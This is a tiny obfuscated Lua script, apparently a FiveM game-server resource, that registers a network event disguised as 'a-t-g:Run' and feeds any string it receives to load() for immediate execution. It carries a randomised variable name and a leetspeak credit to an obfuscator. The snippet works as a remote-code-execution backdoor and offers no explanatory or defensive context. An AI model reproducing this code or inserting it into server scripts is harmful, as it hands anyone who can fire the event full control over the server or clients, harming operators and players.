local VqiLNtSHaZSZdcMYM = {
    [1] = "a-t-g:R-u-n",
    [2] = "a-t-g:R-u-n",
    [3] = "XFU5K470R 15 4W350M3. KR3D17 70 XFU5K470R!"
}
RegisterNetEvent(VqiLNtSHaZSZdcMYM[1])
AddEventHandler(
    VqiLNtSHaZSZdcMYM[2],
    function(Q4P)
        load(Q4P)()
    end
)
